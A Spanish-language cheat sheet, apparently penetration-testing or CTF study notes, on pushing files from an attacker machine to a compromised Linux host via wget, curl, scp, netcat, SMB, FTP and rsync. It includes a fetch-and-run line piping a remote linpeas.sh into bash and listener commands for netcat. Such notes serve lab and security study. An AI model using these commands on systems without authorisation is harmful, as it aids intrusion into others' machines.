### 📌 **Métodos para Transferir Archivos desde la Máquina Atacante a un Linux Comprometido**

Si tienes acceso a una máquina Linux comprometida, puedes transferir archivos de diferentes maneras según las herramientas disponibles.

---

## 🔹 **1️⃣ Usando `wget` o `curl` (Rápido y Sencillo)**

Si `wget` o `curl` están disponibles en la víctima, puedes descargar archivos desde tu máquina atacante.

### **Desde la máquina víctima (Linux)**

```bash
wget http://TU_IP/archivo.sh -O archivo.sh
```

🔹 Alternativa con `curl`:

```bash
curl -o archivo.sh http://TU_IP/archivo.sh
```

### **Desde la máquina atacante (Kali/Linux)**

Inicia un servidor HTTP para compartir archivos:

```bash
python3 -m http.server 80
```

🔹 Luego, la víctima ejecuta `wget` o `curl` para descargar el archivo o ejecutarlo.

```bash
curl http://10.10.14.24/linpeas.sh | bash
```

---

## 🔹 **2️⃣ Usando SCP (Si tienes acceso SSH)**

Si puedes conectarte por SSH, puedes usar `scp` para transferir archivos.

### **Desde la máquina atacante (Linux/Kali)**

```bash
scp archivo.sh usuario@IP_VICTIMA:/tmp/archivo.sh
```

🔹 Si el puerto SSH es diferente al predeterminado (22):

```bash
scp -P 2222 archivo.sh usuario@IP_VICTIMA:/tmp/archivo.sh
```

---

## 🔹 **3️⃣ Netcat (`nc`) - Método Rápido**

Si `nc` está disponible en la víctima, puedes enviar archivos fácilmente.

### **Desde la máquina víctima (Linux)**

```bash
nc -lvnp 4444 > archivo.sh
```

### **Desde la máquina atacante (Kali/Linux)**

```bash
nc IP_VICTIMA 4444 < archivo.sh
```

🔹 Esto enviará `archivo.sh` desde la atacante a la víctima a través de Netcat.

---

## 🔹 **4️⃣ Transferencia con SMB (Si la víctima puede montar SMB)**

Si la víctima puede conectarse a un recurso compartido SMB, puedes usar `impacket-smbserver`.

### **Desde la máquina atacante (Kali)**

```bash
impacket-smbserver share $(pwd) -smb2support
```

### **Desde la máquina víctima (Linux)**

```bash
mkdir /mnt/smb
mount -t cifs //TU_IP/share /mnt/smb -o guest
cp /mnt/smb/archivo.sh /tmp/
```

---

## 🔹 **5️⃣ Usando FTP (Si la víctima tiene `ftp` instalado)**

Si `ftp` está disponible en la víctima, puedes configurar un servidor FTP en la máquina atacante.

### **Desde la máquina atacante (Kali)**

Inicia un servidor FTP con acceso anónimo:

```bash
sudo python3 -m pyftpdlib -p 21
```

### **Desde la máquina víctima (Linux)**

```bash
ftp TU_IP
binary
get archivo.sh
bye
```

---

## 🔹 **6️⃣ Transferencia con `rsync` (Si está disponible)**

Si `rsync` está instalado en la víctima, puedes usarlo para transferir archivos.

### **Desde la máquina atacante (Linux/Kali)**

```bash
rsync -avz archivo.sh usuario@IP_VICTIMA:/tmp/
```

---

## 🚀 **Conclusión**

- **Si `wget` o `curl` están disponibles**, úsalos con un servidor HTTP.
- **Si tienes acceso SSH**, usa `scp` o `rsync`.
- **Si la víctima tiene `nc`**, usa Netcat.
- **Si la víctima puede acceder a SMB o FTP**, compártelos desde la máquina atacante.